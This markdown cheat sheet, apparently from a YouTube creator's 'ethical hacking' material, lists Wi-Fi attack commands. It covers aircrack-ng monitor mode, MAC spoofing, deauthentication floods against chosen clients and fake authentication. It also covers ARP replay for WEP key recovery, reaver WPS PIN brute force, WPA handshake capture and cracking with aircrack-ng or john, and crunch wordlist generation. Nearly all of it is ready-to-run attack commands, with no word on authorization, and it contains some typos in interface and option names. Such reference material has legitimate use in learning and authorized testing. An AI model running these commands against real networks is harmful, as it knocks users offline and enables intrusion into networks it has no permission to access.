# Ethical Hacking Cheat Sheet

|Basic Commands|Advance Commands|
|--------------|----------------|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
---

> ### Check your Network Adapter

```bash
iwconfig 
```

> ### Check IP Address
 ```bash
 ifconfig
 ```


> ### Kill Network Manager
```bash
airmon-ng check kill
```

> ### Enable Network Manager

```bash
service NetworkManager start
```

> ### Restart Network Manager
```bash
systemctl restart NetworkManager
```

> ### Check Status of Network Manager
```bash
systemctl status NetworkManager
```

---
---
---

# Network Adapter Testing Commands

> ### Enable Monitor Mode
```bash
airmon-ng start wlan0
```

> ### Disable Monitor Mode
```bash
airmon-ng stop wlan0
```

> ### Packet Injection test
```bash
aireplay-ng --test wlan0
```

> ### Access Point Creation Test

you can put any fake MAC Address like this `00:01:02:03:04:05`
```bash
airbase-ng -a 00:01:02:03:04:05 --essid "<AP_name>" -c {channel_no.} wlan0
```
---
---
---

# Network Hacking

> ### Changing MAC Address
```bash
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```

MAC address will revert back to the original one once you restart the computer,
because we're only changing the MAC address in memory,
we're not really changing the physical MAC address.

---

# 1. Pre-Connection Attack

> ### Sniff Network around `2.4 GHz`
```bash
airodump-ng wlan0
```

> ### Sniff Network Both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band a wlan0
```

> ### Capture data both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band abg wlan0
```

> ### Capture Data using `airodump-ng`
```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan0
```
to analyze data
```bash
wireshark
```
---
---
---

## DE-Authentication Attack
```bash
aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan0
```
if it`s fails then, target router on specfic channel

```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan0
```
---

# 2. Gaining Access

> ### Associate with router
```bash
aireplay-ng --fakeauth 0 -a {router_MAC_add} -h {Your_NIC_MAC_add} waln1
```

it's literally just telling the target network look, I want to communicate with you, Don't ignore my request.<br/>
here `--fakeauth 0` becuse we just need to associate with network once `--arprelpay` keep forcing the AP to produce another packet with a new IV. Keep doing this till we have enough IVs to crack the key.

# ARP Request Replay Attack
> ### Force Router to generate IVs
```bash
aireplay-ng --arpreplay -b {router_MAC_add} -h {your_NIC_MAC_add} waln1
```
---
---
---
# WPA / WPA2 Cracking

<details>
    <summary>more about WPA / WPA2</summary>
<br/>
● Both can be cracked using the same methods<br/>
● Made to address the issues in WEP.<br/>
● Much more secure.<br/>
● Each packet is encrypted using a unique temporary key.<br/>
<br/>
Exploiting WPS<br/>
● WPS is a feature that can be used with WPA & WPA2.<br/>
● Allows clients to connect without the password.<br/>
● Authentication is done using an 8 digit pin.<br/>
==}> ○ 8 Digits is very small.<br/>
==}> ○ We can try all possible pins in relatively short time.<br/>
==}> ○ Then the WPS pin can be used to compute the actual password.<br/>
PS: This only works if the router is configured not to use PBC (Push Button
Authentication).<br/>
<br/>
● Fixed all weaknesses in WEP.<br/>
● Packets contain no useful data.<br/>
● Only packets that can aid with the cracking process are the handshake packets.<br/>
==}> ○ These are 4 packets sent when a client connects to the network.<br/>
<br/>
● The handshake does not contain data the helps recover the key.<br/>
● It contains data that can be used to check weather a key is valid or
not.<br/>
</details>

# 1. WPA / WPA2 Cracking `Without Word list`

> ## Scan WPS Enable Network Around us

```bash
wash --interface wlan0
```

## Fake-Authentication Attack
```bash
aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan0
```
>[!WARNING]\
>Current version of reaver have some bugs, you can use old version

> ## Brute force the pin attack
```
reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan0 -vvv --no-associate 
```
---
---
---

# 2. WPA / WPA2 Cracking  using `With Word list` or `john-the-riper` tool
## WPA Handshake Capture
```bash
airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan0
```
>[!NOTE]
>Handshake is captured only when new client is connected. we can't wait so use de-authentication attack `parlelly`.

## De-authentication attack
```bash
aireplay-ng --deauth {no_of_deauth_packet} -a {router_MAC_add} -c {target_d_MAc_add} wlan0
```

# Crack Password Using `Handshake file`

> ### `.cap` to `.hccap`
```bash
aircrack-ng {.cap} -J {extension_name_not_required}
```
> ### `.hccap` to `.txt`
```bash
hccap2john {.hccap} > {.txt}
```
> ### Crack Password
```bash
john {.txt}
```

---
---
---

# WPA-key Cracking using `wordlist`
```bash
aircrack-ng {.cap} -w {Wordlist.txt}
```
---
## create word list
```sh
man crunch
crunch 6 8 {key length} abc12 {char used} -o test.txt
```
## Create word list using pattern
```sh
crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@b}
```
---

# =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)

